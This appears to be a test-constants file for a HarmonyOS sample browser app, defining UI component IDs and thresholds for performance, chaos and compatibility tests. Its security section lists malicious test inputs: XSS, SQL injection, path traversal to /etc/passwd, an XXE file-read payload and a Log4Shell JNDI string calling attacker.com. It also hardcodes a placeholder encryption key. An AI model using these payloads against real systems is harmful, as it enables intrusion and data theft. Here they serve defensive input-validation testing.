/*
 * Copyright (c) 2026 Huawei Device Co., Ltd.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * @file TestConstants.ets
 * @overview 测试常量定义文件，集中管理组件ID、阈值、超时时间等魔法数字
 * @category test_constants
 */

/**
 * 浏览器应用配置
 */
export const BUNDLE_NAME: string = 'ohos.samples.browser1';

export const ABILITY_NAME: string = 'MainAbility';

/**
 * 组件ID常量 - 故障注入相关
 */
export interface ComponentIdsType {
  FAULT_INJECTION: string;
  NETWORK_FAULT: string;
  MEMORY_FAULT: string;
  CPU_FAULT: string;
  STORAGE_FAULT: string;
  EXCEPTION_HANDLING: string;
  ERROR_RECOVERY: string;
  FAULT_DETECTION: string;
  SYSTEM_RECOVERY: string;
  AUTO_RECOVERY: string;
  SYSTEM_MONITORING: string;
  FAULT_TOLERANCE: string;
  REDUNDANCY: string;
  GRACEFUL_DEGRADATION: string;
  CHAOS_MONITORING: string;
  METRICS_COLLECTION: string;
  ALERT_SYSTEM: string;
  SESSION_SECURITY: string;
  SESSION_MANAGEMENT: string;
  SESSION_TIMEOUT: string;
  COMMUNICATION_SECURITY: string;
  TLS_SUPPORT: string;
  CERTIFICATE_VALIDATION: string;
  PRIVACY_PROTECTION: string;
  DATA_ANONYMIZATION: string;
  PRIVACY_SETTINGS: string;
  SECURITY_UPDATES: string;
  AUTO_UPDATE: string;
  VULNERABILITY_FIXES: string;
  VULNERABILITY_SCANNER: string;
  SECURITY_HEADERS: string;
  MEMORY_PRESSURE: string;
  CPU_THROTTLING: string;
  DISK_PRESSURE: string;
  NETWORK_DEGRADATION: string;
  INPUT_URL: string;
  VIRTUAL_KEYBOARD: string;
  GESTURE_INPUT: string;
  MEDIA_SUPPORT: string;
  SCREEN_READER_SUPPORT: string;
  ARIA_SUPPORT: string;
  SEMANTIC_MARKUP: string;
  KEYBOARD_NAVIGATION: string;
  FOCUS_MANAGEMENT: string;
  KEYBOARD_SHORTCUTS: string;
  VISUAL_ASSISTANCE: string;
  HIGH_CONTRAST: string;
  FONT_SCALING: string;
  VOICE_CONTROL: string;
  SPEECH_RECOGNITION: string;
  VOICE_FEEDBACK: string;
  ALTERNATIVE_INPUT: string;
  SWITCH_CONTROL: string;
  EYE_TRACKING: string;
  STARTUP_OPTIMIZATION: string;
  LAZY_LOADING: string;
  RESOURCE_PRELOADING: string;
  RENDERING_OPTIMIZATION: string;
  VIRTUALIZATION: string;
  RENDERING_CACHE: string;
  MEMORY_OPTIMIZATION: string;
  GARBAGE_COLLECTION: string;
  MEMORY_POOL: string;
  NETWORK_OPTIMIZATION: string;
  CACHE_STRATEGY: string;
  COMPRESSION: string;
  BATTERY_OPTIMIZATION: string;
  POWER_MANAGEMENT: string;
  BACKGROUND_LIMITS: string;
}

export const ComponentIds: ComponentIdsType = {
  FAULT_INJECTION: 'fault-injection',
  NETWORK_FAULT: 'network-fault',
  MEMORY_FAULT: 'memory-fault',
  CPU_FAULT: 'cpu-fault',
  STORAGE_FAULT: 'storage-fault',

  EXCEPTION_HANDLING: 'exception-handling',
  ERROR_RECOVERY: 'error-recovery',
  FAULT_DETECTION: 'fault-detection',

  SYSTEM_RECOVERY: 'system-recovery',
  AUTO_RECOVERY: 'auto-recovery',
  SYSTEM_MONITORING: 'system-monitoring',

  FAULT_TOLERANCE: 'fault-tolerance',
  REDUNDANCY: 'redundancy',
  GRACEFUL_DEGRADATION: 'graceful-degradation',

  CHAOS_MONITORING: 'chaos-monitoring',
  METRICS_COLLECTION: 'metrics-collection',
  ALERT_SYSTEM: 'alert-system',

  SESSION_SECURITY: 'session-security',
  SESSION_MANAGEMENT: 'session-management',
  SESSION_TIMEOUT: 'session-timeout',

  COMMUNICATION_SECURITY: 'communication-security',
  TLS_SUPPORT: 'tls-support',
  CERTIFICATE_VALIDATION: 'certificate-validation',

  PRIVACY_PROTECTION: 'privacy-protection',
  DATA_ANONYMIZATION: 'data-anonymization',
  PRIVACY_SETTINGS: 'privacy-settings',

  SECURITY_UPDATES: 'security-updates',
  AUTO_UPDATE: 'auto-update',
  VULNERABILITY_FIXES: 'vulnerability-fixes',
  VULNERABILITY_SCANNER: 'vulnerability-scanner',
  SECURITY_HEADERS: 'security-headers',

  MEMORY_PRESSURE: 'memory-pressure',
  CPU_THROTTLING: 'cpu-throttling',
  DISK_PRESSURE: 'disk-pressure',
  NETWORK_DEGRADATION: 'network-degradation',

  INPUT_URL: 'inputUrl',
  VIRTUAL_KEYBOARD: 'virtual-keyboard',
  GESTURE_INPUT: 'gesture-input',
  MEDIA_SUPPORT: 'media-support',

  SCREEN_READER_SUPPORT: 'screen-reader-support',
  ARIA_SUPPORT: 'aria-support',
  SEMANTIC_MARKUP: 'semantic-markup',
  KEYBOARD_NAVIGATION: 'keyboard-navigation',
  FOCUS_MANAGEMENT: 'focus-management',
  KEYBOARD_SHORTCUTS: 'keyboard-shortcuts',
  VISUAL_ASSISTANCE: 'visual-assistance',
  HIGH_CONTRAST: 'high-contrast',
  FONT_SCALING: 'font-scaling',
  VOICE_CONTROL: 'voice-control',
  SPEECH_RECOGNITION: 'speech-recognition',
  VOICE_FEEDBACK: 'voice-feedback',
  ALTERNATIVE_INPUT: 'alternative-input',
  SWITCH_CONTROL: 'switch-control',
  EYE_TRACKING: 'eye-tracking',

  STARTUP_OPTIMIZATION: 'startup-optimization',
  LAZY_LOADING: 'lazy-loading',
  RESOURCE_PRELOADING: 'resource-preloading',

  RENDERING_OPTIMIZATION: 'rendering-optimization',
  VIRTUALIZATION: 'virtualization',
  RENDERING_CACHE: 'rendering-cache',

  MEMORY_OPTIMIZATION: 'memory-optimization',
  GARBAGE_COLLECTION: 'garbage-collection',
  MEMORY_POOL: 'memory-pool',

  NETWORK_OPTIMIZATION: 'network-optimization',
  CACHE_STRATEGY: 'cache-strategy',
  COMPRESSION: 'compression',

  BATTERY_OPTIMIZATION: 'battery-optimization',
  POWER_MANAGEMENT: 'power-management',
  BACKGROUND_LIMITS: 'background-limits'
};

/**
 * 性能阈值常量
 */
export interface PerformanceThresholdsType {
  STARTUP_TIME_EXCELLENT: number;
  STARTUP_TIME_GOOD: number;
  STARTUP_TIME_ACCEPTABLE: number;
  STARTUP_TIME_SLOW: number;
  STARTUP_TIME_MAX: number;
  UI_RENDERING_TIME_MAX: number;
  FPS_EXCELLENT: number;
  FPS_ACCEPTABLE: number;
  FPS_MINIMUM: number;
  JANK_FRAMES_EXCELLENT: number;
  JANK_FRAMES_ACCEPTABLE: number;
  JANK_FRAMES_MAX: number;
  FRAME_TIME_MAX: number;
  MEMORY_USAGE_WARNING: number;
  MEMORY_USAGE_CRITICAL: number;
  MEMORY_USAGE_MAX: number;
  MEMORY_PEAK_WARNING: number;
  MEMORY_PEAK_CRITICAL: number;
  PEAK_MEMORY_MAX: number;
  CPU_USAGE_WARNING: number;
  CPU_USAGE_CRITICAL: number;
  CPU_USAGE_MAX: number;
  CPU_PEAK_WARNING: number;
  CPU_PEAK_CRITICAL: number;
  PEAK_CPU_MAX: number;
  DOWNLOAD_TIME_WARNING: number;
  DOWNLOAD_TIME_CRITICAL: number;
  THROUGHPUT_WARNING: number;
  THROUGHPUT_CRITICAL: number;
  LATENCY_WARNING: number;
  LATENCY_CRITICAL: number;
  NETWORK_LATENCY_MAX: number;
  BATTERY_DRAIN_WARNING: number;
  BATTERY_DRAIN_CRITICAL: number;
  BATTERY_DRAIN_MAX: number;
  POWER_EFFICIENCY_WARNING: number;
  POWER_EFFICIENCY_CRITICAL: number;
  OVERALL_SCORE_MIN: number;
  STARTUP_SCORE_MIN: number;
  RENDERING_SCORE_MIN: number;
}

export const PerformanceThresholds: PerformanceThresholdsType = {
  STARTUP_TIME_EXCELLENT: 1000,
  STARTUP_TIME_GOOD: 2000,
  STARTUP_TIME_ACCEPTABLE: 3000,
  STARTUP_TIME_SLOW: 5000,
  STARTUP_TIME_MAX: 5000,
  UI_RENDERING_TIME_MAX: 1000,

  FPS_EXCELLENT: 60,
  FPS_ACCEPTABLE: 30,
  FPS_MINIMUM: 30,

  JANK_FRAMES_EXCELLENT: 2,
  JANK_FRAMES_ACCEPTABLE: 5,
  JANK_FRAMES_MAX: 5,
  FRAME_TIME_MAX: 33,

  MEMORY_USAGE_WARNING: 50 * 1024 * 1024,
  MEMORY_USAGE_CRITICAL: 100 * 1024 * 1024,
  MEMORY_USAGE_MAX: 100 * 1024 * 1024,
  MEMORY_PEAK_WARNING: 100 * 1024 * 1024,
  MEMORY_PEAK_CRITICAL: 150 * 1024 * 1024,
  PEAK_MEMORY_MAX: 120 * 1024 * 1024,

  CPU_USAGE_WARNING: 60,
  CPU_USAGE_CRITICAL: 80,
  CPU_USAGE_MAX: 70,
  CPU_PEAK_WARNING: 80,
  CPU_PEAK_CRITICAL: 90,
  PEAK_CPU_MAX: 85,

  DOWNLOAD_TIME_WARNING: 3000,
  DOWNLOAD_TIME_CRITICAL: 5000,

  THROUGHPUT_WARNING: 5 * 1024 * 1024,
  THROUGHPUT_CRITICAL: 1 * 1024 * 1024,

  LATENCY_WARNING: 300,
  LATENCY_CRITICAL: 500,
  NETWORK_LATENCY_MAX: 500,

  BATTERY_DRAIN_WARNING: 10,
  BATTERY_DRAIN_CRITICAL: 15,
  BATTERY_DRAIN_MAX: 10,

  POWER_EFFICIENCY_WARNING: 0.8,
  POWER_EFFICIENCY_CRITICAL: 0.7,

  OVERALL_SCORE_MIN: 75,
  STARTUP_SCORE_MIN: 70,
  RENDERING_SCORE_MIN: 80
};

/**
 * 混沌测试阈值常量
 */
export interface ChaosThresholdsType {
  RESILIENCE_SCORE_MINIMUM: number;
  RESILIENCE_SCORE_TARGET: number;
  RECOVERY_EFFICIENCY_MINIMUM: number;
  RECOVERY_EFFICIENCY_TARGET: number;
  FAULT_TOLERANCE_MINIMUM: number;
  FAULT_TOLERANCE_TARGET: number;
  FAILURE_RATE_MAXIMUM: number;
  RECOVERY_TIME_NETWORK: number;
  RECOVERY_TIME_SYSTEM: number;
  RECOVERY_TIME_AVERAGE: number;
  MEMORY_USAGE_MAXIMUM: number;
  CPU_LOAD_MAXIMUM: number;
  STORAGE_USAGE_MAXIMUM: number;
  PERFORMANCE_IMPACT_MINIMUM: number;
  SYSTEM_IMPACT_MAXIMUM: number;
  SUCCESS_RATE_MINIMUM: number;
  CRITICAL_FAILURES_MAXIMUM: number;
  RECOMMENDATIONS_MAXIMUM: number;
}

export const ChaosThresholds: ChaosThresholdsType = {
  RESILIENCE_SCORE_MINIMUM: 40,
  RESILIENCE_SCORE_TARGET: 70,

  RECOVERY_EFFICIENCY_MINIMUM: 75,
  RECOVERY_EFFICIENCY_TARGET: 80,

  FAULT_TOLERANCE_MINIMUM: 70,
  FAULT_TOLERANCE_TARGET: 80,

  FAILURE_RATE_MAXIMUM: 20,

  RECOVERY_TIME_NETWORK: 3000,
  RECOVERY_TIME_SYSTEM: 5000,
  RECOVERY_TIME_AVERAGE: 5000,

  MEMORY_USAGE_MAXIMUM: 95,
  CPU_LOAD_MAXIMUM: 100,
  STORAGE_USAGE_MAXIMUM: 95,

  PERFORMANCE_IMPACT_MINIMUM: 15,
  SYSTEM_IMPACT_MAXIMUM: 50,

  SUCCESS_RATE_MINIMUM: 50,
  CRITICAL_FAILURES_MAXIMUM: 0,
  RECOMMENDATIONS_MAXIMUM: 2
};

/**
 * 安全测试常量
 */
export interface SecurityConstantsType {
  HIGH_RISK_PERMISSIONS: string[];
  MINIMUM_JUSTIFICATION_LENGTH: number;
  ENCRYPTION_KEY: string;
  MALICIOUS_INPUTS: string[];
}

export const SecurityConstants: SecurityConstantsType = {
  HIGH_RISK_PERMISSIONS: ['camera', 'microphone', 'location', 'contacts'],
  MINIMUM_JUSTIFICATION_LENGTH: 10,

  ENCRYPTION_KEY: 'secure_key_123',

  MALICIOUS_INPUTS: [
    '<script>alert("xss")</script>',
    'SELECT * FROM users WHERE 1=1',
    '../../etc/passwd',
    'javascript:alert(1)'
  ]
};

/**
 * 测试数据常量
 */
export interface TestUserType {
  username: string;
  password: string;
  email: string;
}

export interface ThreatScenarioType {
  activity: string;
  data: string;
}

export interface TestDataType {
  DEFAULT_URL: string;
  LARGE_FILE_URL: string;
  LARGE_FILE_SIZE: number;
  DEFAULT_TAB_TITLE: string;
  DEFAULT_TAB_URL: string;
  NEW_TAB_TITLE: string;
  TEST_USER: TestUserType;
  THREAT_SCENARIOS: ThreatScenarioType[];
  SCAN_TYPES: string[];
  TEST_PERMISSIONS: string[];
  MALICIOUS_INPUTS: string[];
}

export const TestData: TestDataType = {
  DEFAULT_URL: 'https://example.com',
  LARGE_FILE_URL: 'https://example.com/large-file',
  LARGE_FILE_SIZE: 10 * 1024 * 1024,

  DEFAULT_TAB_TITLE: '主页',
  DEFAULT_TAB_URL: 'pad.html',
  NEW_TAB_TITLE: '新标签页',

  TEST_USER: {
    username: 'testuser',
    password: 'secret123',
    email: 'test@example.com'
  },

  THREAT_SCENARIOS: [
    { activity: 'script_execution', data: '<script>alert("xss")</script>' },
    { activity: 'sql_query', data: 'DROP TABLE users' },
    { activity: 'url_redirect', data: 'javascript:alert(1)' }
  ],

  SCAN_TYPES: ['xss', 'injection', 'csrf'],
  TEST_PERMISSIONS: ['camera', 'microphone', 'location', 'storage'],
  MALICIOUS_INPUTS: [
    '<script>alert("xss")</script>',
    'DROP TABLE users',
    'javascript:alert(1)',
    '../../etc/passwd',
    '${jndi:ldap://attacker.com/exploit}',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
  ]
};

/**
 * 标签页管理常量
 */
export interface TestConstantsType {
  MAX_TABS: number;
  MIN_TABS: number;
  TAB_SWITCH_PERFORMANCE_THRESHOLD: number;
  TAB_SWITCH_ITERATIONS: number;
  TAB_CONCURRENT_ADD: number;
  TAB_CONCURRENT_SWITCH: number;
  RECOVERY_TIME_THRESHOLD: number;
  USER_EXPERIENCE_THRESHOLD: number;
  THROUGHPUT_THRESHOLD: number;
  CPU_THRESHOLD: number;
  STABILITY_THRESHOLD: number;
  COMBINATIONS_THRESHOLD: number;
  COVERAGE_THRESHOLD: number;
  PERFORMANCE_DEGRADATION_THRESHOLD: number;
  RECOVERY_CAPABILITY_THRESHOLD: number;
  RELIABILITY_SCORE_THRESHOLD: number;
  MTBF_THRESHOLD: number;
  FAILURE_RATE_THRESHOLD: number;
  AVAILABILITY_THRESHOLD: number;
  MAINTAINABILITY_SCORE_THRESHOLD: number;
  COMPLEXITY_THRESHOLD: number;
  TESTABILITY_THRESHOLD: number;
  DOCUMENTATION_THRESHOLD: number;
  OVERALL_QUALITY_THRESHOLD: number;
  ROBUSTNESS_THRESHOLD: number;
  SCALABILITY_THRESHOLD: number;
  SUCCESS_RATE_THRESHOLD: number;
  COMPLEXITY_SCORE_THRESHOLD: number;
  BOUNDARY_COVERAGE_THRESHOLD: number;
}

export const TestConstants: TestConstantsType = {
  MAX_TABS: 7,
  MIN_TABS: 1,
  TAB_SWITCH_PERFORMANCE_THRESHOLD: 2000,
  TAB_SWITCH_ITERATIONS: 10,
  TAB_CONCURRENT_ADD: 3,
  TAB_CONCURRENT_SWITCH: 2,

  RECOVERY_TIME_THRESHOLD: 5000,
  USER_EXPERIENCE_THRESHOLD: 80,
  THROUGHPUT_THRESHOLD: 1000,
  CPU_THRESHOLD: 70,
  STABILITY_THRESHOLD: 95,
  COMBINATIONS_THRESHOLD: 1000,
  COVERAGE_THRESHOLD: 90,
  PERFORMANCE_DEGRADATION_THRESHOLD: 10,
  RECOVERY_CAPABILITY_THRESHOLD: 85,
  RELIABILITY_SCORE_THRESHOLD: 90,
  MTBF_THRESHOLD: 10000,

  FAILURE_RATE_THRESHOLD: 5,
  AVAILABILITY_THRESHOLD: 99,
  MAINTAINABILITY_SCORE_THRESHOLD: 80,
  COMPLEXITY_THRESHOLD: 10,
  TESTABILITY_THRESHOLD: 85,
  DOCUMENTATION_THRESHOLD: 80,
  OVERALL_QUALITY_THRESHOLD: 85,
  ROBUSTNESS_THRESHOLD: 80,
  SCALABILITY_THRESHOLD: 75,
  SUCCESS_RATE_THRESHOLD: 90,
  COMPLEXITY_SCORE_THRESHOLD: 5,
  BOUNDARY_COVERAGE_THRESHOLD: 90
};

/**
 * 超时和延迟常量（已在SharedDriver中定义，此处作为引用）
 */
export interface TestTimeoutsType {
  TIMEOUT_START: number;
  TIMEOUT_NAV: number;
  TIMEOUT_WEB: number;
  STABLE_ROUNDS: number;
  STABLE_TOLERANCE: number;
  DELAY_APP_LAUNCH: number;
  DELAY_NAV_KEY: number;
  APP_LAUNCH_DELAY: number;
}

export const TestTimeouts: TestTimeoutsType = {
  TIMEOUT_START: 10000,
  TIMEOUT_NAV: 5000,
  TIMEOUT_WEB: 8000,
  STABLE_ROUNDS: 2,
  STABLE_TOLERANCE: 10,
  DELAY_APP_LAUNCH: 3000,
  DELAY_NAV_KEY: 500,
  APP_LAUNCH_DELAY: 5000
};

/**
 * 测试循环次数常量
 */
export interface TestIterationsType {
  CACHE_CLEANUP_ITERATIONS: number;
  SESSION_DATA_ITERATIONS: number;
  STRESS_TEST_ITERATIONS: number;
  STRESS_TEST_DELAY: number;
  CONCURRENT_USERS: number;
  CONCURRENT_REQUESTS: number;
}

export const TestIterations: TestIterationsType = {
  CACHE_CLEANUP_ITERATIONS: 10,
  SESSION_DATA_ITERATIONS: 1000,
  STRESS_TEST_ITERATIONS: 100,
  STRESS_TEST_DELAY: 50,
  CONCURRENT_USERS: 10,
  CONCURRENT_REQUESTS: 5
};

/**
 * 兼容性测试常量
 */
export interface CompatibilityConstantsType {
  MIN_SCREEN_WIDTH: number;
  MIN_SCREEN_HEIGHT: number;
  MIN_DPI: number;
  HIGH_DPI: number;
  MIN_API_LEVEL: number;
  MIN_NETWORK_SPEED: number;
  MAX_NETWORK_LATENCY: number;
  TABLET_MIN_WIDTH: number;
  PHONE_MAX_HEIGHT: number;
  TV_MIN_DPI: number;
  BACKGROUND_API_LEVEL: number;
  BIOMETRIC_API_LEVEL: number;
  WEBKIT_VERSION_THRESHOLD: number;
  GECKO_VERSION_THRESHOLD: number;
  JAVASCRIPTCORE_VERSION_THRESHOLD: number;
  WCAG_AA_MAX_ISSUES: number;
  WCAG_A_MAX_ISSUES: number;
}

export const CompatibilityConstants: CompatibilityConstantsType = {
  MIN_SCREEN_WIDTH: 320,
  MIN_SCREEN_HEIGHT: 480,
  MIN_DPI: 120,
  HIGH_DPI: 400,
  MIN_API_LEVEL: 21,
  MIN_NETWORK_SPEED: 100,
  MAX_NETWORK_LATENCY: 1000,
  TABLET_MIN_WIDTH: 600,
  PHONE_MAX_HEIGHT: 2000,
  TV_MIN_DPI: 200,
  BACKGROUND_API_LEVEL: 26,
  BIOMETRIC_API_LEVEL: 28,
  WEBKIT_VERSION_THRESHOLD: 10,
  GECKO_VERSION_THRESHOLD: 50,
  JAVASCRIPTCORE_VERSION_THRESHOLD: 10,
  WCAG_AA_MAX_ISSUES: 2,
  WCAG_A_MAX_ISSUES: 5
};

/**
 * 设备适配测试常量
 */
export interface DeviceAdaptationConstantsType {
  SCREEN_WIDTH_TABLET: number;
  SCREEN_HEIGHT_TABLET: number;
  SCREEN_DENSITY_DEFAULT: number;
  SCREEN_WIDTH_PHONE: number;
  SCREEN_HEIGHT_PHONE: number;
  SCREEN_WIDTH_COMPACT_THRESHOLD: number;
  SCREEN_WIDTH_MEDIUM_THRESHOLD: number;
  SCREEN_WIDTH_LARGE_THRESHOLD: number;
  SCREEN_DENSITY_HIGH: number;
  SCREEN_DENSITY_LOW: number;
}

export const DeviceAdaptationConstants: DeviceAdaptationConstantsType = {
  SCREEN_WIDTH_TABLET: 1920,
  SCREEN_HEIGHT_TABLET: 1080,
  SCREEN_DENSITY_DEFAULT: 2.0,
  SCREEN_WIDTH_PHONE: 360,
  SCREEN_HEIGHT_PHONE: 640,
  SCREEN_WIDTH_COMPACT_THRESHOLD: 600,
  SCREEN_WIDTH_MEDIUM_THRESHOLD: 840,
  SCREEN_WIDTH_LARGE_THRESHOLD: 1200,
  SCREEN_DENSITY_HIGH: 4.0,
  SCREEN_DENSITY_LOW: 1.0
};

/**
 * 回归测试常量
 */
export interface RegressionConstantsType {
  DEVIATION_THRESHOLD: number;
  PERFORMANCE_DEGRADATION_THRESHOLD: number;
  COMPATIBILITY_SCORE_THRESHOLD: number;
  SEVERITY_CRITICAL_THRESHOLD: number;
  SEVERITY_HIGH_THRESHOLD: number;
  SEVERITY_MEDIUM_THRESHOLD: number;
  PERFORMANCE_CRITICAL_THRESHOLD: number;
  PERFORMANCE_HIGH_THRESHOLD: number;
  PERFORMANCE_MEDIUM_THRESHOLD: number;
  PERFORMANCE_REGRESSION_MULTIPLIER: number;
}

export const RegressionConstants: RegressionConstantsType = {
  DEVIATION_THRESHOLD: 5,
  PERFORMANCE_DEGRADATION_THRESHOLD: 10,
  COMPATIBILITY_SCORE_THRESHOLD: 90,
  SEVERITY_CRITICAL_THRESHOLD: 20,
  SEVERITY_HIGH_THRESHOLD: 10,
  SEVERITY_MEDIUM_THRESHOLD: 5,
  PERFORMANCE_CRITICAL_THRESHOLD: 50,
  PERFORMANCE_HIGH_THRESHOLD: 25,
  PERFORMANCE_MEDIUM_THRESHOLD: 10,
  PERFORMANCE_REGRESSION_MULTIPLIER: 1.1
};

/**
 * 网络测试常量
 */
export interface NetworkConstantsType {
  REQUEST_TIMEOUT: number;
  DELAY_MIN: number;
  DELAY_MAX: number;
  SIGNAL_THRESHOLD_INTERNET: number;
  SIGNAL_THRESHOLD_FAST: number;
  SIGNAL_THRESHOLD_WEAK: number;
  RECONNECT_DELAY: number;
  STATS_TOTAL: number;
  STATS_FAILED: number;
  STATS_LATENCY: number;
}

export const NetworkConstants: NetworkConstantsType = {
  REQUEST_TIMEOUT: 5000,
  DELAY_MIN: 500,
  DELAY_MAX: 1000,
  SIGNAL_THRESHOLD_INTERNET: 10,
  SIGNAL_THRESHOLD_FAST: 50,
  SIGNAL_THRESHOLD_WEAK: 20,
  RECONNECT_DELAY: 1000,
  STATS_TOTAL: 100,
  STATS_FAILED: 5,
  STATS_LATENCY: 350
};

/**
 * 旋转测试常量
 */
export interface RotationConstantsType {
  RESET_DELAY: number;
  ROTATION_90_DELAY: number;
  ROTATION_90_CHECK_TIMEOUT: number;
  SURFACE_MIN: number;
  SURFACE_THRESHOLD: number;
  ROTATION_180_DELAY: number;
  SEQUENCE_90_DELAY: number;
  SEQUENCE_RESET_DELAY: number;
  SEQUENCE_CHECK_TIMEOUT: number;
  SEQUENCE_SURFACE_THRESHOLD: number;
}

export const RotationConstants: RotationConstantsType = {
  RESET_DELAY: 900,
  ROTATION_90_DELAY: 1400,
  ROTATION_90_CHECK_TIMEOUT: 4000,
  SURFACE_MIN: 5,
  SURFACE_THRESHOLD: 18,
  ROTATION_180_DELAY: 1200,
  SEQUENCE_90_DELAY: 800,
  SEQUENCE_RESET_DELAY: 1000,
  SEQUENCE_CHECK_TIMEOUT: 4000,
  SEQUENCE_SURFACE_THRESHOLD: 22
};

/**
 * 标签页测试常量
 */
export interface TabTestConstantsType {
  SWITCH_DELAY: number;
  SWITCH_CHECK_TIMEOUT: number;
  SWITCH_SURFACE_MIN: number;
  SWITCH_SURFACE_THRESHOLD: number;
  MULTI_TAB_ADD_DELAY: number;
  MULTI_TAB_CHECK_TIMEOUT: number;
  MULTI_TAB_SURFACE_THRESHOLD: number;
}

export const TabTestConstants: TabTestConstantsType = {
  SWITCH_DELAY: 900,
  SWITCH_CHECK_TIMEOUT: 3000,
  SWITCH_SURFACE_MIN: 5,
  SWITCH_SURFACE_THRESHOLD: 18,
  MULTI_TAB_ADD_DELAY: 600,
  MULTI_TAB_CHECK_TIMEOUT: 3500,
  MULTI_TAB_SURFACE_THRESHOLD: 26
};

/**
 * 压力测试常量
 */
export interface StressTestConstantsType {
  ITERATIONS: number;
  SURFACE_CHANGE_THRESHOLD: number;
  HOME_SURFACE_MIN: number;
  HOME_SURFACE_THRESHOLD: number;
}

export const StressTestConstants: StressTestConstantsType = {
  ITERATIONS: 5,
  SURFACE_CHANGE_THRESHOLD: 28,
  HOME_SURFACE_MIN: 5,
  HOME_SURFACE_THRESHOLD: 24
};

/**
 * Web交互测试常量
 */
export interface WebInteractionConstantsType {
  SURFACE_CHANGE_THRESHOLD: number;
  BACK_DELAY: number;
  BACK_WAIT_DELAY: number;
  BACK_CHECK_TIMEOUT: number;
}

export const WebInteractionConstants: WebInteractionConstantsType = {
  SURFACE_CHANGE_THRESHOLD: 16,
  BACK_DELAY: 800,
  BACK_WAIT_DELAY: 1000,
  BACK_CHECK_TIMEOUT: 3200
};

/**
 * 最终验证测试常量
 */
export interface ValidationConstantsType {
  QUALITY_THRESHOLD: number;
  EXCELLENT_QUALITY_THRESHOLD: number;
  GOOD_QUALITY_THRESHOLD: number;
  FAIR_QUALITY_THRESHOLD: number;
  EXCELLENT_RATING_MAX_FINDINGS: number;
  GOOD_RATING_MAX_FINDINGS: number;
  FAIR_RATING_MAX_FINDINGS: number;
  CONDITIONAL_APPROVAL_MAX_DETAILS: number;
  QUALITY_CRITICAL_FINDINGS: number;
}

export const ValidationConstants: ValidationConstantsType = {
  QUALITY_THRESHOLD: 80,
  EXCELLENT_QUALITY_THRESHOLD: 90,
  GOOD_QUALITY_THRESHOLD: 80,
  FAIR_QUALITY_THRESHOLD: 70,
  EXCELLENT_RATING_MAX_FINDINGS: 0,
  GOOD_RATING_MAX_FINDINGS: 2,
  FAIR_RATING_MAX_FINDINGS: 5,
  CONDITIONAL_APPROVAL_MAX_DETAILS: 2,
  QUALITY_CRITICAL_FINDINGS: 999
};

/**
 * 输入验证测试常量
 */
export interface InputValidationConstantsType {
  MAX_URL_LENGTH: number;
  SHORT_URL_LENGTH: number;
  LONG_URL_LENGTH: number;
  OVER_LIMIT_LENGTH: number;
}

export const InputValidationConstants: InputValidationConstantsType = {
  MAX_URL_LENGTH: 2048,
  SHORT_URL_LENGTH: 100,
  LONG_URL_LENGTH: 10000,
  OVER_LIMIT_LENGTH: 2049
};

/**
 * 核心引擎测试常量
 */
export interface CoreEngineConstantsType {
  LOAD_PROGRESS_STEP: number;
  LOAD_PROGRESS_DELAY: number;
  LOAD_PROGRESS_MAX: number;
  CONCURRENT_LOAD_COUNT: number;
  SURFACE_COUNT_TOLERANCE: number;
  PERFORMANCE_TIMEOUT: number;
}

export const CoreEngineConstants: CoreEngineConstantsType = {
  LOAD_PROGRESS_STEP: 10,
  LOAD_PROGRESS_DELAY: 50,
  LOAD_PROGRESS_MAX: 100,
  CONCURRENT_LOAD_COUNT: 3,
  SURFACE_COUNT_TOLERANCE: 20,
  PERFORMANCE_TIMEOUT: 5000
};

/**
 * 数据一致性测试常量
 */
export interface DataConsistencyConstantsType {
  SYNC_TEST_DELAY: number;
  CONFLICT_TEST_DELAY: number;
  INTEGRITY_TEST_DELAY: number;
  BACKUP_DELAY: number;
  TRANSACTION_OP_DELAY: number;
  TIMESTAMP_CONFLICT_THRESHOLD: number;
  CONSISTENCY_SCORE_THRESHOLD: number;
  RELIABILITY_SCORE_THRESHOLD: number;
  PERFORMANCE_SCORE_THRESHOLD: number;
  DATA_LOSS_PERCENT: number;
}

export const DataConsistencyConstants: DataConsistencyConstantsType = {
  SYNC_TEST_DELAY: 200,
  CONFLICT_TEST_DELAY: 150,
  INTEGRITY_TEST_DELAY: 180,
  BACKUP_DELAY: 300,
  TRANSACTION_OP_DELAY: 50,
  TIMESTAMP_CONFLICT_THRESHOLD: 1000,
  CONSISTENCY_SCORE_THRESHOLD: 80,
  RELIABILITY_SCORE_THRESHOLD: 85,
  PERFORMANCE_SCORE_THRESHOLD: 75,
  DATA_LOSS_PERCENT: 100
};

/**
 * 混沌测试延迟常量
 */
export interface ChaosDelayConstantsType {
  NETWORK_FAULT_DELAY: number;
  MEMORY_FAULT_DELAY: number;
  CPU_FAULT_DELAY: number;
  STORAGE_FAULT_DELAY: number;
  EXCEPTION_HANDLING_DELAY: number;
  SYSTEM_RECOVERY_DELAY: number;
}

export const ChaosDelayConstants: ChaosDelayConstantsType = {
  NETWORK_FAULT_DELAY: 100,
  MEMORY_FAULT_DELAY: 120,
  CPU_FAULT_DELAY: 80,
  STORAGE_FAULT_DELAY: 150,
  EXCEPTION_HANDLING_DELAY: 90,
  SYSTEM_RECOVERY_DELAY: 200
};

/**
 * 兼容性测试延迟常量
 */
export interface CompatibilityDelayConstantsType {
  DEVICE_TEST_DELAY: number;
  SYSTEM_TEST_DELAY: number;
  NETWORK_TEST_DELAY: number;
  BROWSER_TEST_DELAY: number;
  I18N_TEST_DELAY: number;
  ACCESSIBILITY_TEST_DELAY: number;
}

export const CompatibilityDelayConstants: CompatibilityDelayConstantsType = {
  DEVICE_TEST_DELAY: 100,
  SYSTEM_TEST_DELAY: 80,
  NETWORK_TEST_DELAY: 120,
  BROWSER_TEST_DELAY: 150,
  I18N_TEST_DELAY: 90,
  ACCESSIBILITY_TEST_DELAY: 110
};

/**
 * 回归测试延迟常量
 */
export interface RegressionDelayConstantsType {
  FUNCTIONAL_TEST_DELAY: number;
  PERFORMANCE_TEST_DELAY: number;
  COMPATIBILITY_TEST_DELAY: number;
  SECURITY_TEST_DELAY: number;
  BASELINE_DELAY: number;
  REPORT_DELAY: number;
}

